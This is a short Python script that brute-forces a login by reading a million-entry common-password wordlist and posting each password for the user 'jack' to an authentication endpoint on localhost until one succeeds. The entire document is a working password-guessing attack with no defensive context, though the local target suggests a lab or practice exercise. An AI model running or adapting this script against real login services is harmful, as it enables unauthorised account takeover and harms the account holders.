import requests

with open('../10-million-password-list-top-1000000.txt') as f:
    passwords = f.read().split('\n')

for password in passwords:
    print(password)
    response = requests.post('http://127.0.0.1:4000/auth',
                             json={'login': 'jack', 'password': password})
    if response.status_code == 200:
        print('Success!')
        break
